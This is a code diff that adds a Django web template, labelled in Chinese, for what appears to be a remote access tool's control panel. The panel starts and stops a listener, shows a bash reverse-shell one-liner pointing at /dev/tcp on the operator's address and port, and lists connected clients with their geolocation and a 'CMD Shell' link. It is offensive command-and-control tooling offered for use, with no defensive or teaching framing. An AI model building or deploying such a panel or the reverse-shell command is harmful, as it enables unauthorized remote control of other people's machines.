@@ -1,0 +1,73 @@
+{% extends 'framework.html' %}
+{% load rat_helper %}
+
+{% block subject %}远程终端{% endblock %}
+
+{% block content %}
+<div class="row">
+  <div class="col-md-6">
+    <div class="panel widget">
+     <div class="panel-heading">操作</div>
+     <div class="panel-body">
+       <form method="post">
+         <button class="btn btn-labeled btn-info" type="submit" name="start" value="1"
+         {% if port %}disabled{% endif %}
+         >
+           <span class="btn-label"><i class="icon-control-play"></i>
+           </span>启动服务器</button>
+
+         <button class="btn btn-labeled btn-warning" type="submit" name="stop" value="1"
+         {% if not port %}disabled{% endif %}
+         >
+           <span class="btn-label"><i class="icon-control-pause"></i>
+           </span>停止服务器</button>
+         {% csrf_token %}
+       </form>
+
+     </div>
+    </div>
+  </div>
+
+  <div class="col-md-6">
+    <div class="panel widget">
+       <div class="panel-body">
+          <h3 class="mt0">Listening {{ port | default_if_none:'pending...' }}</h3>
+          <pre class="b0 m0"><code>bash -c 'sh -i >& /dev/tcp/{{ address }}/{{ port | default_if_none:'21' }} 0>&1'</code></pre>
+       </div>
+    </div>
+  </div>
+</div>
+
+<div class="panel panel-default">
+ <div class="panel-heading">我的客户端</div>
+ <div class="panel-body">
+    <div class="table-responsive">
+       <table class="table table-striped">
+          <thead>
+             <tr>
+                <th>时间</th>
+                <th>地址</th>
+                <th>位置</th>
+                <th>端口</th>
+                <th>管理</th>
+             </tr>
+          </thead>
+          <tbody>
+            {% for object in object_list %}
+             <tr>
+                <td>{{ object.created_time | date:"Y-m-d H:i:s" }}</td>
+                <td>{{ object.address }}</td>
+                <td>{{ object.address | location }}</td>
+                <td>{{ object.port }}</td>
+                <td>
+                    <a type="button" class="mb-sm btn-xs btn btn-primary btn-outline"
+                       href="{% url 'rat:rat-detail' pk=object.serid %}">CMD Shell</a>
+                </td>
+             </tr>
+            {% endfor %}
+          </tbody>
+       </table>
+    </div>
+ </div>
+</div>
+{% endblock %}
